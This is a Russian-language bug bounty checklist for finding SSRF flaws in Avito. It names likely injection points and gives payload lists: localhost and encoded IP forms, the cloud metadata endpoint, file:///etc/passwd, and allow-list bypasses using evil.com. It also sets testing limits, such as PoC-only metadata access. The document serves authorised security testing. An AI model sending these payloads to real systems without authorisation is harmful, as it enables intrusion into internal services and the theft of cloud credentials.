# SSRF — Avito

## Что ищем
Server-Side Request Forgery — сервер делает запрос по URL, который контролирует атакующий.

## Где искать
- Загрузка по URL (аватарки, изображения объявлений, импорт с внешнего сайта)
- Вебхуки (интеграции с партнёрами, Maxposter, Haraba)
- Превью ссылок в чатах / отзывах
- PDF-генерация (wkhtmltopdf, headless Chrome)
- Интеграции с внешними API (парсинг объявлений, autoteka)
- GraphQL: аргументы `url`, `link`, `image`, `callback`
- OAuth: `redirect_uri`, `jwks_uri`, `request_uri`

## Цели SSRF
- **Внутренние сервисы:** `http://127.0.0.1:8080`, `http://169.254.169.254/` (AWS metadata), `http://metadata.google.internal/`
- **Внутренняя сеть:** `http://10.0.0.1/`, `http://192.168.0.1/`
- **Файлы:** `file:///etc/passwd`, `gopher://`, `dict://`
- **DNS rebinding:** обход allow-list через свой DNS

## Базовые payload'ы
```
http://127.0.0.1:80/
http://127.0.0.1:8080/admin
http://169.254.169.254/latest/meta-data/
http://[::1]:80/
http://localhost:22/
file:///etc/passwd
http://2130706433/       # decimal 127.0.0.1
http://0x7f.0.0.1/       # hex
http://127.1/            # короткая форма
```

## Обходы allow-list
- `http://evil.com@127.0.0.1/`
- `http://127.0.0.1#@evil.com/`
- `http://127.0.0.1.nip.io/`
- DNS rebinding (свой DNS → 127.0.0.1)
- Редирект с разрешённого домена на внутренний

## Инструменты
- Burp Collaborator / interactsh
- SSRFmap
- Gopherus (для gopher)

## Чек-лист
- [ ] Найти параметры с URL (upload-by-url, webhook, preview)
- [ ] Подставить Collaborator → увидеть запрос
- [ ] Попробовать `http://169.254.169.254/latest/meta-data/` (только PoC)
- [ ] Попробовать `file:///etc/hostname`
- [ ] Проверить обходы allow-list (127.1, decimal, IPv6)
- [ ] Проверить DNS rebinding, если есть allow-list

## Не делать
- Не атаковать инфраструктуру партнёров
- Не пытаться получить IAM-токены и использовать их
- В PoC — только подтверждение (1 запрос к metadata), без выгрузки
